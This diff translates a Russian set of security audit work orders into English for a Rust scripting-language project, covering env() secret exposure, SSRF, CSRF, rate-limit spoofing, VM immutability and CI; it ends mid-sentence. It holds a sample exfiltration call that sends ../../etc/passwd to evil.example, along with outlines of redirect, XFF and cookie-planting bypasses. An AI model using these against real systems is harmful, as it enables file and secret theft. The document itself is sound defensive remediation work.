@@ -1,353 +1,351 @@
-# Наряды №258–265 — хвосты аудита: security, correctness, hygiene
+# Naryads #258–265 — audit tails: security, correctness, hygiene
 
-Серия продолжит нумерацию `docs/naryads-252-257-security-bugfix.md` (номера
-252–257 заняты). Все факты верифицированы на main @ `0d356dd` 2026-09-11:
-греп + чтение кода + runtime-пробы (вывод проб приведён дословно). Наряды
-пишутся по лекалу ADR-0122 (карта) и AGENT.md §8: факт → задача → §3 →
-«сделано, когда». Отклонения от §3 — громко, §8.4.
+The series continues the numbering of `docs/naryads-252-257-security-bugfix.md` (the numbers
+252–257 are taken). All facts verified on main @ `0d356dd` 2026-09-11:
+grep + code reading + runtime probes (the probe output is quoted verbatim). The naryads
+are written per the ADR-0122 template (map) and AGENTS.md §8: fact → task → §3 →
+"done, when". Deviations from §3 — loudly, §8.4.
 
-Порядок исполнения и зависимости:
+Execution order and dependencies:
 
 ```
-№258 (docs, Block 3 №252)  — независимо, первым (валидация конвейера)
-№260 (multipart read)      — независимо
-№261 (SSRF-пакет)          — после №260 (тот же файл http.rs)
-№264 (VM immutability)     — независимо
-№262 (CSRF)                — независимо
-№263 (rate-limit/bounds)   — после №262 (тот же файл server.rs)
-№253-А (exec_gate, #256)   — уже в очереди (issue существует)
-№259 (env-гейт)            — ПОСЛЕ №253-А: переиспользует exec_gate(context)
-№265 (CI hygiene)          — независимо, последним
+#258 (docs, Block 3 of #252)  — independent, first (pipeline validation)
+#260 (multipart read)         — independent
+#261 (SSRF package)           — after #260 (same file http.rs)
+#264 (VM immutability)        — independent
+#262 (CSRF)                   — independent
+#263 (rate-limit/bounds)      — after #262 (same file server.rs)
+#253-A (exec_gate, #256)      — already queued (issue exists)
+#259 (env gate)               — AFTER #253-A: reuses exec_gate(context)
+#265 (CI hygiene)             — independent, last
 ```
 
 ---
 
-## Наряд №258 (P2, docs) — Block 3 наряда №252: строка в карте ADR-0122 + CHANGELOG
+## Naryad #258 (P2, docs) — Block 3 of naryad #252: a row in the ADR-0122 map + CHANGELOG
 
-**Факт.** Наряд №252 исполнен и смержен (PR #261, merge `b8553f2`,
-закрыл issue #255), но docs-блок не доделан: PR #261 тронул только
-`src/builtins/io.rs` и `src/builtins/http.rs`. (1) В карте нарядов
-`docs/adr/0122-vision-pillar-scope.md` (раздел «Naryad map — single
-source of truth») нет строки #252 — последние строки: #251, #248, #247,
-#250; прецедент: строки добавляются docs-коммитом после мержа (см.
-`1a7c3d5` «map row #250», `a72dbbc` «map row #247»). (2) В CHANGELOG
-`[Unreleased]` нет записей о закрытии P0 TOCTOU и о поведенческом
-изменении write_file/append_file (громкие sandbox-ошибки вместо тихой
-пустой строки) — а это два материальных изменения для пользователей
-0.19.
+**Fact.** Naryad #252 is implemented and merged (PR #261, merge `b8553f2`,
+closed issue #255), but the docs block was not finished: PR #261 touched only
+`src/builtins/io.rs` and `src/builtins/http.rs`. (1) In the naryad map
+`docs/adr/0122-vision-pillar-scope.md` (the section "Naryad map — single
+source of truth") there is no #252 row — the last rows: #251, #248, #247,
+#250; precedent: rows are added by a docs commit after the merge (see
+`1a7c3d5` "map row #250", `a72dbbc` "map row #247"). (2) The CHANGELOG
+`[Unreleased]` has no entries on the closing of the P0 TOCTOU or on the behavioral
+change of write_file/append_file (loud sandbox errors instead of the silent
+empty string) — and these are two material changes for users
+of 0.19.
 
-**Задача.**
-1. Строка #252 в карту ADR-0122: maintenance/security, краткое
-   содержание (канонический возврат + двухфазное открытие O_NOFOLLOW,
-   закрыт также http_download), статус «merged, PR #261».
+**Task.**
+1. A #252 row into the ADR-0122 map: maintenance/security, a brief
+   summary (canonical return + two-phase O_NOFOLLOW open,
+   http_download also closed), status "merged, PR #261".
 2. CHANGELOG `[Unreleased]`:
-   - **Fixed** — write-path symlink TOCTOU (sandbox_path_ex возвращает
-     канонический путь; open_sandbox_write: create_new → канонизация +
-     повторная проверка префикса + O_NOFOLLOW; http_download закрыт тем
-     же хелпером);
-   - **Changed** — write_file/append_file/http_download: нарушение
-     песочницы теперь ГРОМКАЯ ошибка («file I/O sandbox: ...») вместо
-     тихого soft-failure; ОС-ошибки остались soft. Отметить как
-     breaking для кода, полагавшегося на тихий отказ (0.19 допускает
-     breaking — решение владельца по №253-А).
-3. Строки для #253 (документ нарядов) и #254 (issue-шаблон) —
-   опционально, одной строкой каждая, тем же PR.
+   - **Fixed** — write-path symlink TOCTOU (sandbox_path_ex returns
+     the canonical path; open_sandbox_write: create_new → canonicalization +
+     prefix re-check + O_NOFOLLOW; http_download closed by the
+     same helper);
+   - **Changed** — write_file/append_file/http_download: a sandbox
+     violation is now a LOUD error ("file I/O sandbox: ...") instead of
+     a silent soft-failure; OS errors remain soft. Mark as
+     breaking for code that relied on the silent failure (0.19 allows
+     breaking — owner decision per #253-A).
+3. Rows for #253 (the naryad document) and #254 (the issue template) —
+   optional, one line each, in the same PR.
 
-**§3.** `docs/adr/0122-vision-pillar-scope.md`, `CHANGELOG.md`. Ноль
-диффа в `src/**` и `tests/**`.
+**§3.** `docs/adr/0122-vision-pillar-scope.md`, `CHANGELOG.md`. Zero
+diff in `src/**` and `tests/**`.
 
-**Сделано, когда:** строка #252 видна в карте; обе записи в CHANGELOG;
-`readme_consistency` и остальные блокирующие джобы зелёные на
-мерж-коммите.
+**Done, when:** the #252 row is visible in the map; both entries in the CHANGELOG;
+`readme_consistency` and the other blocking jobs green on
+the merge commit.
 
 ---
 
-## Наряд №259 (P1, security) — env(): негейтованное чтение переменных процесса (зависит от №253-А)
+## Naryad #259 (P1, security) — env(): ungated reads of process variables (depends on #253-A)
 
-**Факт.** `src/builtins/io.rs:156-162` (`builtin_env`) возвращает любую
-переменную окружения процесса без каких-либо гейтов во всех контекстах,
-включая serve. Runtime-проба на main @ `0d356dd`:
+**Fact.** `src/builtins/io.rs:156-162` (`builtin_env`) returns any
+process environment variable with no gates whatsoever in all contexts,
+including serve. Runtime probe on main @ `0d356dd`:
 
 ```
 $ FAKE_API_SECRET_TOKEN=sk-supersecret mlog run probe_env.mlog
 token=sk-supersecret
 ```
 
-probe_env.mlog — одна строка `return "token=" +
-env("FAKE_API_SECRET_TOKEN")`. В serve-контексте тело роута — это код,
-получающий недоверенный ввод; один вызов `env("...")` в шаблоне/роуте
-отдаёт секреты процесса: LLM API-ключи, ключи БД, токены деплоя.
-Прецеденты: `exec()` гейтится `METALOGOS_ALLOW_EXEC=1` с наряда №97
-(`io.rs:479-483`); `http_*` приватные сети —
-`METALOGOS_HTTP_ALLOW_PRIVATE=1` (№130). `env()` — последний
-незакрытый негейтованный канал наружу процесса.
+probe_env.mlog is a single line `return "token=" +
+env("FAKE_API_SECRET_TOKEN")`. In the serve context the route body is code
+receiving untrusted input; a single call of `env("...")` in a template/route
+hands out the process secrets: LLM API keys, DB keys, deploy tokens.
+Precedents: `exec()` is gated by `METALOGOS_ALLOW_EXEC=1` since naryad #97
+(`io.rs:479-483`); `http_*` private networks —
+`METALOGOS_HTTP_ALLOW_PRIVATE=1` (#130). `env()` is the last
+ungated channel out of the process.
 
-**Задача.** Гейт в духе выбранного владельцем варианта А по №253:
-1. В serve-контексте `env(key)` по умолчанию — громкая ошибка с
-   стабильным кодом по конвенции ADR-0131 (`ENV_NOT_PERMITTED`) и
-   подсказкой точного имени переменной-флага.
-2. Эскейп-хэтчи (заменяющая семантика, не AND, как в №253-А):
-   `METALOGOS_SERVE_ALLOW_ENV=1` — разрешить всё в serve; либо
-   `METALOGOS_ENV_ALLOWLIST="MODEL,TEMP,..."` (список имён, читаемых в
-   serve без гейта).
-3. Вне serve (run/repl/check) поведение не меняется — локальный скрипт
-   читает своё окружение, это контракт.
-4. Механизм определения serve-контекста — переиспользовать SSOT из
-   №253-А (`exec_gate(context)`), не плодить второй флаг-хак: наряд
-   блокируется на №253-А.
+**Task.** A gate in the spirit of the owner-chosen option A of #253:
+1. In the serve context `env(key)` by default — a loud error with
+   a stable code per the ADR-0131 convention (`ENV_NOT_PERMITTED`) and
+   a hint naming the exact flag variable.
+2. Escape hatches (override semantics, not AND, as in #253-A):
+   `METALOGOS_SERVE_ALLOW_ENV=1` — allow everything in serve; or
+   `METALOGOS_ENV_ALLOWLIST="MODEL,TEMP,..."` (a list of names readable in
+   serve without a gate).
+3. Outside serve (run/repl/check) the behavior does not change — a local script
+   reads its own environment; that is the contract.
+4. The serve-context detection mechanism — reuse the SSOT from
+   #253-A (`exec_gate(context)`), do not spawn a second flag hack: this naryad
+   is blocked on #253-A.
 
-**§3.** `src/builtins/io.rs` (builtin_env), механизм контекста из
-№253-А (`src/server.rs`/инъекции интерпретатора — по факту кода
-№253-А), README-раздел env(), CHANGELOG (Changed, breaking для serve).
+**§3.** `src/builtins/io.rs` (builtin_env), the context mechanism from
+#253-A (`src/server.rs`/interpreter injection — per the actual code of
+#253-A), the README section on env(), CHANGELOG (Changed, breaking for serve).
 
-**Сделано, когда:** проба `env("FAKE_API_SECRET_TOKEN")` в serve-роуте
-→ 500/ошибка с кодом `ENV_NOT_PERMITTED` при отсутствии флагов; с
-`METALOGOS_ENV_ALLOWLIST=FAKE_API_SECRET_TOKEN` → читается; тот же код
-под `mlog run` → читается как сегодня; существующие тесты env зелёные;
-новые тесты (serve-гейт, allowlist, вне-serve поведение) без `#[ignore]`.
+**Done, when:** the probe `env("FAKE_API_SECRET_TOKEN")` in a serve route
+→ 500/an error with the code `ENV_NOT_PERMITTED` when no flags are set; with
+`METALOGOS_ENV_ALLOWLIST=FAKE_API_SECRET_TOKEN` → readable; the same code
+under `mlog run` → readable as today; the existing env tests stay green;
+new tests (serve gate, allowlist, outside-serve behavior) without `#[ignore]`.
 
 ---
 
-## Наряд №260 (P1, security) — http_post_multipart: чтение файлов по сырым путям — примитив эксфильтрации
+## Naryad #260 (P1, security) — http_post_multipart: file reads by raw paths — an exfiltration primitive
 
-**Факт.** `src/builtins/http.rs:862-865` (`builtin_http_post_multipart`):
-поля-файлы читаются `std::fs::read(path)` по **сырому** пути из
-аргумента программы — без `sandbox_path`/`SandboxMode::ForRead`. Любой
-роут/шаблон, куда попадает недоверенная строка, может отправить файл
-откуда угодно из ФС хоста на URL из программы:
+**Fact.** `src/builtins/http.rs:862-865` (`builtin_http_post_multipart`):
+file fields are read with `std::fs::read(path)` by the **raw** path from
+a program argument — without `sandbox_path`/`SandboxMode::ForRead`. Any
+route/template an untrusted string reaches can send a file
+from anywhere on the host FS to a URL from the program:
 
 ```
 http_post_multipart("https://evil.example", {}, {"f": "../../etc/passwd"})
 ```
 
-Это единственное файловое чтение в билтинах вне песочницы (read_file,
-vision_lora_load, http_download — все проверены песочницей/weights-dir).
-Контраст: комментарий на `http.rs:252` заявляет SSRF-гейт для
-multipart — исходящий URL гейтится (`apply_ssrf_resolves`,
-`http.rs:846-851`), а чтение отправляемых файлов — нет.
+This is the only file read in the builtins outside the sandbox (read_file,
+vision_lora_load, http_download — all checked by sandbox/weights-dir).
+Contrast: the comment at `http.rs:252` claims an SSRF gate for
+multipart — the outgoing URL is gated (`apply_ssrf_resolves`,
+`http.rs:846-851`), but the reading of the files being sent is not.
 
-**Задача.** Прогонять каждый файловый путь через
-`sandbox_path_ex(path, SandboxMode::ForRead)`; нарушение песочницы —
-громкая ошибка с текстом «file I/O sandbox: ...» (лекало — write_file
-после №252; стабильный код `SANDBOX_VIOLATION` добавит исполнение
-№254-конвенции, здесь достаточно громкого текста, если №254 ещё не
-смержен). Относительные пути внутри песочницы читаются как сегодня —
-легитимный кейс «отправить файл, созданный программой» не ломается.
+**Task.** Pass every file path through
+`sandbox_path_ex(path, SandboxMode::ForRead)`; a sandbox violation —
+a loud error with the text "file I/O sandbox: ..." (the template — write_file
+after #252; the stable code `SANDBOX_VIOLATION` will come with the execution of
+the #254 convention; a loud text suffices here if #254 is not
+merged yet). Relative paths inside the sandbox are read as today —
+the legitimate case "send a file created by the program" does not break.
 
-**§3.** `src/builtins/http.rs` (только файловые поля multipart),
-README-раздел http_post_multipart, тесты.
+**§3.** `src/builtins/http.rs` (only the multipart file fields),
+the README section on http_post_multipart, tests.
 
-**Сделано, когда:** тест: `http_post_multipart(url, {}, {"f":
-"../../../etc/passwd"})` → громкая ошибка; файл внутри песочницы →
-отправляется (мок-сервер); абсолютный путь → громкая ошибка; Тест-мок
-принимающей стороны — локальный bind 127.0.0.1, без внешней сети;
-`METALOGOS_HTTP_ALLOW_PRIVATE=1` в тестах, где нужен резолв; CI
-зелёный.
+**Done, when:** test: `http_post_multipart(url, {}, {"f":
+"../../../etc/passwd"})` → a loud error; a file inside the sandbox →
+is sent (mock server); an absolute path → a loud error; the receiving-side
+mock — a local bind to 127.0.0.1, no external network;
+`METALOGOS_HTTP_ALLOW_PRIVATE=1` in tests where a resolve is needed; CI
+green.
 
 ---
 
-## Наряд №261 (P1, security) — SSRF-пакет исходящего HTTP: диапазоны адресов, redirect-политика, http_download без гейта
+## Naryad #261 (P1, security) — SSRF package for outbound HTTP: address ranges, redirect policy, ungated http_download
 
-**Факт.** Три дыры одного класса (исходящий HTTP-эгресс) в
+**Fact.** Three holes of one class (outbound HTTP egress) in
 `src/builtins/http.rs` @ `0d356dd`:
 
-1. **Диапазоны.** `is_blocked_address` (`http.rs:259-277`) блокирует
-   loopback/link-local/private/metadata/ULA(fc00::/7), но пропускает:
+1. **Ranges.** `is_blocked_address` (`http.rs:259-277`) blocks
+   loopback/link-local/private/metadata/ULA(fc00::/7) but lets through:
    IPv4-mapped IPv6 (`::ffff:10.0.0.5`, `::ffff:169.254.169.254` —
-   ветка V6 не разворачивает mapped-адреса), unspecified
+   the V6 branch does not unwrap mapped addresses), unspecified
    (`0.0.0.0`, `::`), CGNAT `100.64.0.0/10`, benchmark `198.18.0.0/15`.
-2. **Redirect.** Грейп `redirect` по `http.rs` — **0 вхождений**:
-   reqwest по умолчанию ходит по 30x (до 10 хопов), и каждый хоп
-   резолвит DNS заново БЕЗ повторного SSRF-пина — обход пина одним
-   редиректом на хост атакующего (плюс утечка Authorization-заголовка
-   кросс-хосту по умолчанию).
-3. **http_download.** Строит собственный клиент
-   (`http.rs:719-725`) и шлёт запрос напрямую (`:732`) —
-   `apply_ssrf_resolves` НЕ вызывается (контраст:
-   http_get/http_post/http_post_multipart гейтятся; комментарий
-   `http.rs:252` обещает гейт только для трёх). IO-сторона download
-   закрыта №252, эгресс-сторона — нет.
+2. **Redirect.** A grep for `redirect` over `http.rs` — **0 occurrences**:
+   reqwest by default follows 30x (up to 10 hops), and every hop
+   re-resolves DNS WITHOUT a repeated SSRF pin — the pin is bypassed with
+   a single redirect to an attacker host (plus the Authorization header is leaked
+   cross-host by default).
+3. **http_download.** Builds its own client
+   (`http.rs:719-725`) and sends the request directly (`:732`) —
+   `apply_ssrf_resolves` is NOT called (contrast:
+   http_get/http_post/http_post_multipart are gated; the comment
+   `http.rs:252` promises the gate only for the three). The IO side of download
+   is closed by #252; the egress side is not.
 
-**Задача.**
-1. `is_blocked_address`: разворот IPv4-mapped IPv6 (`to_ipv4_mapped()`)
-   с повторной проверкой V4-ветки; блок `is_unspecified`; CGNAT
-   100.64/10 и 198.18/15 — явными диапазонами (std не даёт хелперов).
-2. Redirect-политика: `Policy::none()` для всех четырёх эгресс-билтинов
-   (get/post/multipart/download) — ответ 3xx возвращается как есть,
-   решение за программой (security-by-design: нечестное использование
-   громко). Breaking — задокументировать в README/CHANGELOG (0.19
-   допускает). Альтернатива «ходить с ре-пином на каждом хопу» — вне
-   объёма, точка ревизита в CHANGELOG.
-3. http_download: прогнать URL через `apply_ssrf_resolves` как у трёх
-   остальных.
+**Task.**
+1. `is_blocked_address`: unwrapping of IPv4-mapped IPv6 (`to_ipv4_mapped()`)
+   with a re-check by the V4 branch; block `is_unspecified`; CGNAT
+   100.64/10 and 198.18/15 — as explicit ranges (std provides no helpers).
+2. Redirect policy: `Policy::none()` for all four egress builtins
+   (get/post/multipart/download) — a 3xx response is returned as is;
+   the decision belongs to the program (security-by-design: misuse is
+   loud). Breaking — document in README/CHANGELOG (0.19
+   allows it). The alternative "follow with a re-pin on every hop" is out of
+   scope; a revisit point in the CHANGELOG.
+3. http_download: pass the URL through `apply_ssrf_resolves` like the
+   other three.
 
-**§3.** `src/builtins/http.rs`, README-разделы http_*, CHANGELOG
-(Changed: redirect), тесты `naryad_130_ssrf_guard.rs` /
-`naryad_150_ipv6_ula_ssrf.rs` (расширить, не ломать).
+**§3.** `src/builtins/http.rs`, README sections http_*, CHANGELOG
+(Changed: redirect), tests `naryad_130_ssrf_guard.rs` /
+`naryad_150_ipv6_ula_ssrf.rs` (extend, do not break).
 
-**Сделано, когда:** юнит-тесты на каждый новый блок-диапазон (mapped,
-0.0.0.0, ::, 100.64.1.1, 198.18.0.1); тест: редирект 302 → статус и
-Location возвращаются, тело НЕ скачивается (мок-сервер); тест:
-http_download на 127.0.0.1 без флага → громкий отказ (сейчас —
-успешное скачивание); существующие SSRF-тесты зелёные.
+**Done, when:** unit tests for every new blocked range (mapped,
+0.0.0.0, ::, 100.64.1.1, 198.18.0.1); test: a 302 redirect → the status and
+Location are returned, the body is NOT downloaded (mock server); test:
+http_download to 127.0.0.1 without the flag → a loud refusal (currently —
+a successful download); the existing SSRF tests stay green.
 
 ---
 
-## Наряд №262 (P1, security) — CSRF: stateless-fallback принимает невыданные токены; привязка к сессии мертва
+## Naryad #262 (P1, security) — CSRF: the stateless fallback accepts tokens never issued; the session binding is dead
 
-**Факт.** `src/server.rs` @ `0d356dd`, `check_csrf` (начало `:806`):
+**Fact.** `src/server.rs` @ `0d356dd`, `check_csrf` (start `:806`):
 
-1. При совпадении cookie `_mlog_csrf` и заголовка `X-CSRF-Token` токен,
-   **который сервер никогда не выдавал**, принимается: комментарий
-   `:835-838` «If absent (e.g. server restarted, or stateless
-   double-submit client), accept» — `.unwrap_or(false)` на `:841`.
-   Классический обход naive double-submit: атакующий, способный
-   посадить cookie (subdomain-инъекция), подбирает любую пару
-   cookie+header — сервер проверяет лишь их равенство.
-2. Привязка токена к сессии мертва: при выдаче пишется
-   `(session_id_for_csrf, Instant)` (`:786-788`), но `check_csrf`
-   session_id не получает и с ним не сверяется — хранится только ради
-   TTL.
+1. When cookie `_mlog_csrf` and header `X-CSRF-Token` match, a token
+   **the server never issued** is accepted: the comment
+   `:835-838` "If absent (e.g. server restarted, or stateless
+   double-submit client), accept" — `.unwrap_or(false)` at `:841`.
+   A classic bypass of naive double-submit: an attacker able to
+   plant a cookie (subdomain injection) picks any
+   cookie+header pair — the server only checks their equality.
+2. The token-to-session binding is dead: at issuance `(session_id_for_csrf, Instant)` is written (`:786-788`), but `check_csrf`
+   receives no session_id and never compares against it — it is kept only
+   for the TTL.
 
-**Задача.**
-1. Убрать stateless-fallback: токен обязан присутствовать в
-   `csrf_tokens` сервера (выдан этим процессом и не истёк по TTL);
-   «сервер перезапустился» — честный 403 с перезапросом токена (страница
-   перезагружается, токен перевыдаётся — UX-деградация ограничена).
-2. Прокинуть идентификатор сессии в `check_csrf` и сверять с записанным
-   при выдаче: несовпадение — 403 + запись в audit_log («CSRF: session
-   binding mismatch»). Мёртвая половина кортежа начинает работать.
-3. Не трогать механику выдачи (№125: NO HttpOnly — контракт
-   double-submit читается JS), TTL 15 минут не менять.
+**Task.**
+1. Remove the stateless fallback: the token must be present in the server's
+   `csrf_tokens` (issued by this process and not expired by TTL);
+   "the server restarted" — an honest 403 with a token re-request (the page
+   reloads, the token is reissued — the UX degradation is bounded).
+2. Pass the session identifier into `check_csrf` and compare it with the one recorded
+   at issuance: a mismatch — 403 + a record in audit_log ("CSRF: session
+   binding mismatch"). The dead half of the tuple starts working.
+3. Do not touch the issuance mechanics (#125: NO HttpOnly — the
+   double-submit contract is that it is readable by JS); do not change the 15-minute TTL.
 
-**§3.** `src/server.rs` (check_csrf, точка выдачи, вызов из роутера),
-тесты `naryad_125_csrf_no_httponly.rs` (расширить), README-раздел
+**§3.** `src/server.rs` (check_csrf, the issuance point, the call from the router),
+tests `naryad_125_csrf_no_httponly.rs` (extend), the README section on
 middleware.
 
-**Сделано, когда:** тест: самодельная пара cookie+header (не из стора)
-→ 403 (сейчас — 200); тест: валидный токен с чужой сессией → 403;
-тест: выданный токен своей сессии → проходит; TTL-тесты зелёные;
-сервер-тесты без внешней сети.
+**Done, when:** test: a homemade cookie+header pair (not from the store)
+→ 403 (currently — 200); test: a valid token with a foreign session → 403;
+test: an issued token of its own session → passes; the TTL tests stay green;
+server tests without external network.
 
 ---
 
-## Наряд №263 (P1, security) — rate-limit по подменяемому XFF; карты состояния без границ
+## Naryad #263 (P1, security) — rate-limit keyed on a spoofable XFF; state maps without bounds
 
-**Факт.** `src/server.rs` @ `0d356dd`:
+**Fact.** `src/server.rs` @ `0d356dd`:
 
-1. `extract_client_ip` (`:894-896`) берёт `x-forwarded-for` (затем
-   `x-real-ip`) и **никогда** — реальный peer-адрес: ConnectInfo в
-   сервер не прокидывается (грейп — 0 вхождений). Любой клиент кладёт
-   `X-Forwarded-For: <случайное>` на каждый запрос → ключ
-   `check_rate_limit` (`:721`, лимит жёстко 100) всегда свежий —
-   rate-limit не ограничивает ничего, кроме честных клиентов.
-2. Карты состояния (`:143-171`): `sessions`, `csrf_tokens`,
-   `rate_limits` — `DashMap` без ограничения размера. Чистка есть
-   только у csrf_tokens (`:438-450`, expired-свип); `rate_limits`
-   чистит только записи одного ключа, `sessions` — не чистится вовсе
-   (аутсайдер-ключи живут вечно). Сценарий: дешёвая HTTP-помойка
-   уникальных ключей → неограниченный рост памяти процесса.
+1. `extract_client_ip` (`:894-896`) takes `x-forwarded-for` (then
+   `x-real-ip`) and **never** the real peer address: ConnectInfo is not
+   passed into the server (grep — 0 occurrences). Any client sends
+   `X-Forwarded-For: <random>` with every request → the key of
+   `check_rate_limit` (`:721`, the limit is hard-coded 100) is always fresh —
+   the rate limit constrains nothing except honest clients.
+2. The state maps (`:143-171`): `sessions`, `csrf_tokens`,
+   `rate_limits` — `DashMap` without a size bound. Sweeping exists
+   only for csrf_tokens (`:438-450`, an expired sweep); `rate_limits`
+   is swept only of one key's entries, `sessions` is not swept at all
+   (outsider keys live forever). Scenario: a cheap HTTP flood of
+   unique keys → unbounded growth of the process's memory.
 
-**Задача.**
-1. Реальный IP: `into_make_service_with_connect_info::<SocketAddr>()`
-   + peer-адрес как ключ по умолчанию; XFF/X-Real-IP — ТОЛЬКО если
-   установлен `METALOGOS_TRUSTED_PROXIES` (CIDR/список; из XFF берём
-   последний доверенный хоп — документировать выбранную семантику
-   громко).
-2. Границы карт: кап на количество записей (константа + метрика в
-   лог), при превышении — отказ новой сессии/ключа с 429/503 вместо
-   молчаливого роста; свип устаревших записей для `rate_limits`
-   (лекало csrf-свипа) и для `sessions` (TTL из конфига сервера,
-   по умолчанию — текущий контракт сессий).
-3. Лимит 100 — вынести в декларацию сервера (поле с дефолтом),
-   не менять дефолт.
+**Task.**
+1. Real IP: `into_make_service_with_connect_info::<SocketAddr>()`
+   + the peer address as the default key; XFF/X-Real-IP — ONLY if
+   `METALOGOS_TRUSTED_PROXIES` is set (CIDR/list; from XFF take the
+   last trusted hop — document the chosen semantics
+   loudly).
+2. Map bounds: a cap on the entry count (a constant + a metric in the
+   log); on exceeding it — refuse a new session/key with 429/503 instead of
+   silent growth; a sweep of stale entries for `rate_limits`
+   (the csrf sweep as the template) and for `sessions` (a TTL from the server config,
+   by default — the current session contract).
+3. The limit 100 — move into the server declaration (a field with a default);
+   do not change the default.
 
-**§3.** `src/server.rs`, README-разделы rate_limit/sessions, тесты
-`test_74_*` (расширить), CHANGELOG (Changed: ключ rate-limit).
+**§3.** `src/server.rs`, README sections rate_limit/sessions, tests
+`test_74_*` (extend), CHANGELOG (Changed: the rate-limit key).
 
-**Сделано, когда:** тест: 101-й запрос с одного peer-адреса → 429;
-тест: подмена XFF без trusted-proxies не меняет ключ (клиент с
-XFF и без — один бакет); тест: с METALOGOS_TRUSTED_PROXIES ключ
-берётся из XFF; тест: кап карты — отказ громкий, память ограничена;
-connect-info прокинут, сервер-тесты зелёные.
+**Done, when:** test: the 101st request from one peer address → 429;
+test: XFF spoofing without trusted-proxies does not change the key (a client with
+XFF and one without — a single bucket); test: with METALOGOS_TRUSTED_PROXIES the key
+is taken from XFF; test: the map cap — the refusal is loud, memory is bounded;
+connect-info passed through, the server tests stay green.
 
 ---
 
-## Наряд №264 (P2, bug) — неизменяемость: mlog check пропускает, VM молча присваивает (проба)
+## Naryad #264 (P2, bug) — immutability: mlog check passes, the VM silently assigns (probe)
 
-**Факт.** Контракт (наряд #14, REFERENCE.md:108-116, примеры
-`examples/p30_assign_*`): без `let mut` присваивание — ошибка
-«cannot assign to immutable variable». Runtime-проба на main @
-`0d356dd` (pattern+flow, тело: `let x = 10` / `x = 20` / `return
+**Fact.** The contract (naryad #14, REFERENCE.md:108-116, the
+`examples/p30_assign_*` examples): without `let mut`, assignment is the error
+"cannot assign to immutable variable". Runtime probe on main @
+`0d356dd` (pattern+flow, body: `let x = 10` / `x = 20` / `return
 to_string(x)`):
 
 ```
 $ mlog check probe.mlog     → OK: no issues found.            (exit 0)
 $ mlog run probe.mlog       → error: cannot assign to immutable variable: x
                               (use 'let mut x' to make it mutable)  (exit 1, TW)
-$ mlog compile && mlog run probe.mbc → печатает 20             (exit 0, VM)
+$ mlog compile && mlog run probe.mbc → prints 20             (exit 0, VM)
 ```
 
-Три бэкенда — три ответа: статический анализ пропускает, TW отказывает
-(контракт), VM молча нарушает контракт и присваивает. Программа,
-отвергнутая `mlog run`, успешно работает после `mlog compile` — паритет
-бэкендов (№160/n250-линия) нарушен в типобезопасности, молча.
+Three backends — three answers: static analysis lets it pass, TW refuses
+(the contract), the VM silently violates the contract and assigns. A program
+rejected by `mlog run` runs successfully after `mlog compile` — backend
+parity (the #160/n250 line) is broken in type safety, silently.
 
-**Задача.**
-1. `semantic.rs`: статическая ошибка присваивания не-mut переменной
-   (текст лекалом из TW: «cannot assign to immutable variable: x (use
-   'let mut x' to make it mutable)») — теперь `mlog check` ловит до
-   запуска. Проверить: не ломает ли существующий корпус examples
-   (p30_assign_immutable ожидает ошибку — сверить канал: его .error
-   проверяет TW-путь).
-2. VM: `StoreAssign`-ветка — присваивание глобалу/локалу без mut-флага
-   (флаг известен компилятору на момент компиляции — переносится в
-   метаданные инструкции или отдельная таблица mut-слотов в Program;
-   схема .mbc не ломать — проверка компилятором при генерации: если
-   семантика уже отвергла, до VM не доходит; VM-проверка — бэкстоп с
-   громкой ошибкой) — никогда не молчит.
-3. Паритет-тест: один и тот же source → идентичный исход TW и VM
-   (обе громко ошибаются, или check отвергает до обоих).
+**Task.**
+1. `semantic.rs`: a static error for assignment to a non-mut variable
+   (the text per the TW template: "cannot assign to immutable variable: x (use
+   'let mut x' to make it mutable)") — now `mlog check` catches it before
+   the run. Check: does it break the existing examples corpus
+   (p30_assign_immutable expects an error — verify the channel: its .error
+   checks the TW path).
+2. VM: the `StoreAssign` branch — an assignment to a global/local without the mut flag
+   (the flag is known to the compiler at compile time — carried into
+   instruction metadata or a separate mut-slot table in the Program;
+   do not break the .mbc schema — a compiler check at generation: if
+   semantics already rejected it, it never reaches the VM; the VM check is a
+   backstop with a loud error) — never silent.
+3. Parity test: the same source → identical outcomes of TW and VM
+   (both fail loudly, or check rejects before both).
 
-**§3.** `src/semantic.rs`, `src/compiler.rs`/`src/vm.rs` (минимум для
-бэкстопа), тесты (новый `naryad_264_*`), examples — только если
-корпус содержит не-mut присваивания (тогда громко в PR-теле перечислить).
+**§3.** `src/semantic.rs`, `src/compiler.rs`/`src/vm.rs` (the minimum for the
+backstop), tests (a new `naryad_264_*`), examples — only if the
+corpus contains non-mut assignments (then list them loudly in the PR body).
 
-**Сделано, когда:** проба-факт перевёрнута: `mlog check` → ошибка;
-если семантику обойти (скомпилировать past-check) — VM громко ошибается,
-не печатает 20; `#[ignore]`-счётчик не растёт; vm_golden/crosscheck
-зелёные.
+**Done, when:** the probe fact is reversed: `mlog check` → an error;
+if semantics is bypassed (compiled past-check) — the VM fails loudly,
+does not print 20; the `#[ignore]` counter does not grow; vm_golden/crosscheck
+green.
 
 ---
 
-## Наряд №265 (P3, hygiene) — CI ubuntu-only; покрытие не измеряется
+## Naryad #265 (P3, hygiene) — CI is ubuntu-only; coverage is not measured
 
-**Факт.** `.github/workflows/ci.yml` @ `0d356dd`: все джобы —
-`runs-on: ubuntu-latest` (10 вхождений; грейп). Проект позиционируется
-как переносимый Rust, но: (1) нет ни одной джобы на другой ОС —
-`#[cfg(unix)]`-код (O_NOFOLLOW из №252, unix-symlink тесты) на Windows
-никогда не проверяется даже на компилируемость в CI-матрице; (2)
-покрытие кода не измеряется нигде и никак — «620 lib tests» известны,
-а какая доля `src/**` ими не трогается — неизвестно (находка аудита
-«coverage нет»).
+**Fact.** `.github/workflows/ci.yml` @ `0d356dd`: all jobs are
+`runs-on: ubuntu-latest` (10 occurrences; grep). The project is positioned
+as portable Rust, but: (1) there is not a single job on another OS —
+`#[cfg(unix)]` code (O_NOFOLLOW from #252, the unix-symlink tests) is never checked
+on Windows even for compilability in the CI matrix; (2) code coverage is not measured
+anywhere or in any way — the "620 lib tests" are known, but what share of `src/**` they do not touch is unknown (the audit finding
+"no coverage").
 
-**Задача.**
-1. Матрица: добавить одну advisory-джобу `cargo check --all-features
-   --all-targets` на `windows-latest` + одну на `macos-latest`
-   (адvisory: не блокирующие, зелёность фиксируется в отчёте джобы,
-   блокирующими не делать — ubuntu-джобы остаются единственным
-   blocking-набором; linux-only зависимости при обнаружении — громко
-   перечислить в PR-теле).
-2. Coverage: advisory-джоба `cargo llvm-cov --summary` (или
-   tarpaulin) с выгрузкой summary-артефакта; пороговые ворота НЕ
